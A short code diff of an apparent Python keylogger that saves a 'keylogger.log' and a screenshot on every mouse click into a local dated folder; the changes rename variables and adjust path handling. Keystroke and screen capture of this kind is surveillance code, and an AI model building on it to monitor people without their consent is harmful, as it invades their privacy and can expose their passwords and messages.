@@ -5,11 +5,11 @@ import re, os, pyautogui as pyt
 
 datanow = datetime.now()
 data = datanow.strftime('%D-%M')
-save = r'C:\Users\arthu\Desktop\Save\Content_' + data + '//'
-arqlog = save + 'keylogger.log'
+saves = r'C:\Users\arthu\Desktop\Save\Content_' + data + '\\'
+arqlog = saves + 'keylogger.log'
 
 try:
-    os.mkdir(save)
+    os.mkdir(saves)
 except:
     pass
 
@@ -18,10 +18,10 @@ def on_press():
 
 def on_click(x, y, button, pressed):
     if pressed:
-        Print = pyt.screenshot()
+        screenshot = pyt.screenshot()
         hora = datetime.now()
         horaprint = hora.strftime('%H:%M:%S')
-        Print.save(os.path.join(save, 'printklp_'+ horaprint +'.jpg'))
+        screenshot.save(os.path.join(saves + 'printklp_'+ horaprint +'.jpg'))
 
 
 #keyboardListener = KeyboardListener(on_press=on_press)
